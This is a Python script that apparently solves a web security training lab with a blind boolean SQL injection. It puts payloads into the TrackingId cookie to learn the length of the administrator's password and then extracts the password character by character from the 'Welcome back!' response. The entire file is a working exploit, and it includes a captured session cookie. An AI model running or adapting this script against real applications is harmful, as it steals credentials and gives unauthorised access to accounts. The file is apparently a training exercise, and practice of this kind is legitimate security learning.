import requests
from string import ascii_lowercase, ascii_uppercase, digits

'''
GET /login HTTP/2
Host: 0adb00c5045fd4c181ac390c0089009d.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: TrackingId=rND7zy9f0Uzuj96c; session=x7Y7Jr18CYom5vPuRxLT1KAd5yB6rm2h
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
TE: trailers
'''

url = "https://0adb00c5045fd4c181ac390c0089009d.web-security-academy.net/login"

headers = {
    "Host": "0adb00c5045fd4c181ac390c0089009d.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

cookies = {
    "session": "x7Y7Jr18CYom5vPuRxLT1KAd5yB6rm2h"
}

def check_password_length():
    '''
    Password length is 20
    '''
    cookies["TrackingId"] = f"rND7zy9f0Uzuj96c' and (SELECT 'a' FROM users WHERE username='administrator' and LENGTH(password)=20)='a' --"
    response = requests.get(url, headers=headers, cookies=cookies)

    if "Welcome back!" in response.text:
        print("True")
    else:
        print("False")

def check_password():
    printable = digits[::-1] + ascii_lowercase + "!@#$%^&*()_+{}[]"
    password = ""
    for i in range(1, 21):
        for char in printable:
            cookies["TrackingId"] = f"rND7zy9f0Uzuj96c' and (SELECT SUBSTRING(password, {i},1) FROM users WHERE username='administrator')='{char}"
            response = requests.get(url, headers=headers, cookies=cookies)
            print(cookies["TrackingId"])
            if "Welcome back!" in response.text:
                password += char
                print(password)
                break

check_password()